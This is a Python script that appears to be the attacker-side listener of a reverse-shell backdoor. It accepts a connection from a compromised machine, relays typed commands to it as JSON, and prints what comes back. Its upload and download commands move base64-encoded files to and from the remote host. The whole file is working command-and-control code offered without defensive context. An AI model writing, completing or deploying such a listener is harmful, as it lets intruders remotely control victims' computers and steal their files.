import socket
import json
import base64

class socketListener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Listening...")
        (self.my_connection, my_address) = listener.accept()
        print("Connection OK from " + str(my_address))

    def json_send(self, data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data.encode('utf-8'))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.my_connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, command_input):
        self.json_send(command_input)
        if command_input[0] == "quit":
            self.my_connection.close()
            exit()
        return self.json_receive()

    def save_file(self, path, content):
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download OK!"

    def get_file_content(self, path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read()).decode('utf-8')

    def start_listener(self):
        while True:
            command_input = input("Enter command: ").split(" ")
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)
                command_output = self.command_execution(command_input)
                if command_input[0] == "download" and "Error" not in command_output:
                    command_output = self.save_file(command_input[1], command_output)
                print(command_output)
            except Exception as e:
                print(f"Error: {str(e)}")

ip = input("IP: ")
port = int(input("Port: "))
mySocketListener = socketListener(ip, port)
mySocketListener.start_listener()